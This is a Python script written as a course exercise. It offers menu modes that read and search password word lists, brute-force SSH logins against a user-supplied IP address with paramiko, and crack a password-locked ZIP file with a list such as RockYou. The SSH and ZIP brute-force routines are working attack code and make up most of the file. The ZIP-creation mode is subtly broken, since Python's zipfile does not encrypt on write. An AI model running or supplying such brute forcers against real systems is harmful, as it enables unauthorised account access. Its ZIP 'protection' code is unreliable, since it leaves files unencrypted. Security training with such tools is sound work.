#! /usr/bin/python 3



# Script:   code challenge 11           
# Author: Raheem Sharif Reed                     
# Date of latest revision: August 2, 2023      
# Purpose:In Python, create a script that prompts the user to select one of the following modes:Mode 1: Offensive; Dictionary Iterator
#Accepts a user input word list file path and iterates through the word list, assigning the word being read to a variable.
#Add a delay between words.
#Print to the screen the value of the variable.
#Mode 2: Defensive; Password Recognized
#Accepts a user input string.
#Accepts a user input word list file path.
#Search the word list for the user input string.
#Print to the screen whether the string appeared in the word list
#Authenticate to an SSH server by its IP address.
#Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.
#Create a .txt file containing a secret message.
#Follow the guide,https://www.howtoforge.com/how-to-protect-zip-file-with-password-on-ubuntu-1804/ , to archive the .txt file with password protection.
#Next, add a new mode to your Python brute force tool that allows you to brute force attack a password-locked zip file.
#Use the zipfile library.
#Pass it the RockYou.txt list to test all words in the list against the password-locked zip file.


import paramiko
import time
import zipfile

def read_word_list(file_path):
    with open(file_path, 'r') as file:
        word_list = [word.strip() for word in file.readlines()]
    return word_list

def iterate_and_print(file_path, delay=0):
    word_list = read_word_list(file_path)
    for word in word_list:
        print(word)
        time.sleep(delay)

def search_word_in_list(word, file_path):
    word_list = read_word_list(file_path)
    if word in word_list:
        print(f"The word '{word}' appeared in the word list.")
    else:
        print(f"The word '{word}' did not appear in the word list.")

def ssh_authentication(ip, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=10)
        print(f"Successful login to {ip} with username '{username}' and password '{password}'.")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"Failed to authenticate to {ip} with username '{username}' and password '{password}'.")
        return False
    except paramiko.SSHException as e:
        print(f"SSH error occurred: {e}")
        return False
    except Exception as e:
        print(f"Error occurred: {e}")
        return False

def create_secret_txt(secret_message, txt_file_path):
    with open(txt_file_path, 'w') as txt_file:
        txt_file.write(secret_message)

def archive_with_password(txt_file_path, zip_file_path, password):
    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.setpassword(password.encode('utf-8'))
        zip_file.write(txt_file_path)

def brute_force_attack_zip(zip_file_path, word_list_file_path):
    word_list = read_word_list(word_list_file_path)
    with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
        for password in word_list:
            try:
                zip_file.extractall(pwd=password.encode('utf-8'))
                print(f"Successfully extracted the contents of the ZIP file using the password: '{password}'")
                break
            except RuntimeError as e:
                if 'Bad password' in str(e):
                    print(f"Failed to extract using the password: '{password}'")
                else:
                    print(f"An error occurred: {e}")
                    break

if __name__ == "__main__":
    print("Select one of the following modes:")
    print("1. Iterate through a word list file and print words.")
    print("2. Search for a word in a word list file.")
    print("3. SSH Authentication using a word list.")
    print("4. Create a password-protected ZIP file with a secret message.")
    print("5. Brute force attack a password-locked ZIP file.")
    
    choice = int(input("Enter 1, 2, 3, 4, or 5: "))

    if choice == 1:
        file_path = input("Enter the path to the word list file: ")
        delay = float(input("Enter the delay between words (in seconds): "))
        iterate_and_print(file_path, delay)
    elif choice == 2:
        word = input("Enter the word to search: ")
        file_path = input("Enter the path to the word list file: ")
        search_word_in_list(word, file_path)
    elif choice == 3:
        ip = input("Enter the IP address of the SSH server: ")
        username = input("Enter the SSH username: ")
        file_path = input("Enter the path to the word list file: ")

        word_list = read_word_list(file_path)
        for password in word_list:
            if ssh_authentication(ip, username, password):
                break
    elif choice == 4:
        secret_message = "This is a secret message!"
        txt_file_path = "secret_message.txt"
        create_secret_txt(secret_message, txt_file_path)

        zip_file_path = input("Enter the path for the password-protected ZIP file: ")
        password = input("Enter the password for the ZIP file: ")
        archive_with_password(txt_file_path, zip_file_path, password)

    elif choice == 5:
        zip_file_path = input("Enter the path to the password-locked ZIP file: ")
        word_list_file_path = input("Enter the path to the word list file: ")
        brute_force_attack_zip(zip_file_path, word_list_file_path)

    else:
        print("Invalid choice. Please select 1, 2, 3, 4, or 5.")
